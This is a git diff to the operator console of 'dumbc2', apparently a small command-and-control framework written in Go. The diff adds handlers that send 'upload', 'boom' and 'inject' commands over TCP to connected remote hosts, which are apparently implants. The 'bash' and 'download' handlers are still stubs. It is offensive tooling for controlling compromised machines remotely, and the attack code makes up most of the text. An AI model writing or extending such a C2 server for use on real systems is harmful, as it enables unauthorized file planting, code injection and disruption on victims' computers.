@@ -1,13 +1,15 @@
 package useri
 
 import (
+	"encoding/binary"
 	"fmt"
 	"github.com/kmahyyg/dumbc2/config"
+	"github.com/kmahyyg/dumbc2/remoteop"
 	"github.com/kmahyyg/dumbc2/transport"
 	"github.com/kmahyyg/dumbc2/utils"
 	"log"
 	"net"
-	"strconv"
+	"os"
 	"strings"
 	"time"
 )
@@ -57,18 +59,64 @@ func handleClient(conn net.Conn){
 		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
 		useriptD := strings.Split(useript, " ")
+		var curRTCmd *remoteop.RTCommand
 		switch useriptD[0] {
 		case "upload":
-			//todo: build rtcommand and send
+			fd, err := os.Stat(useriptD[1])
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			fdlen := func() int64{
+				size := fd.Size()
+				return (size / 1048576) + 1
+			}
+			if fdlen() > 255 {
+				log.Println("Exceeds max length, 253M")
+				continue
+			} else {
+				buf := make([]byte,1)
+				binary.PutVarint(buf, fdlen())
+				curRTCmd = &remoteop.RTCommand{
+					Command:        []byte("UPLD"),
+					FilePathLocal:  []byte(useriptD[1]),
+					FilePathRemote: []byte(useriptD[2]),
+					FileLength:     buf[0],
+				}
+				err := curRTCmd.BuildnSend(conn)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				//todo: check pingback result
+			}
 		case "download":
 			//todo
 		case "boom":
-			//todo
+			curRTCmd := &remoteop.RTCommand{
+				Command: []byte("BOOM"),
+				HasData: 0,
+			}
+			err := curRTCmd.BuildnSend(conn)
+			if err != nil {
+				log.Println(err)
+			}
 			break
 		case "bash":
 			//todo
 		case "inject":
-			//todo
+			curRTCmd := &remoteop.RTCommand{
+				Command:    []byte("INJE"),
+				FileLength: 1,  // Max 1M Allowed
+				HasData:    1,
+				RealData:   []byte(useriptD[1]),
+			}
+			err := curRTCmd.BuildnSend(conn)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			// todo: check ping back
 		case "exit":
 			break
 		case "help":
